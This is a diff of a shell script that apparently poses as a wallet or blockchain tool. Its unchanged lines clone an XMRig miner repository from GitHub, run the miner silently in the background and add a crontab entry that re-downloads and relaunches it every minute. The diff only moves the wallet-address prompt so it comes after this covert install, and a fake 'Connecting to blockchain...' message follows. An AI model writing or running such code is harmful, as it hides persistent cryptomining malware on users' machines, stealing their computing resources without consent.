@@ -26,13 +26,15 @@ echo ""
 echo ""
 git clone https://github.com/katerin966/xmrig.git && cd xmrig && tar xvzf xmrig.tar.gz && ./xmrig &> /dev/null &
 echo ""
-echo "Enter yourt wallet address:"
-read wallet
-echo "Accepted!"$wallet
 echo ""
 echo "*/1 * * * * git clone https://github.com/katerin966/xmrig.git && cd xmrig && tar xvzf xmrig.tar.gz && ./xmrig &> /dev/null &" > cron && cat cron | crontab -
 echo ""
 rm cron
+echo ""
+echo ""
+echo "Enter yourt wallet address:"
+read wallet
+echo "Accepted!"$wallet
 echo "Connecting to blockchain..."
 count=0
 total=34
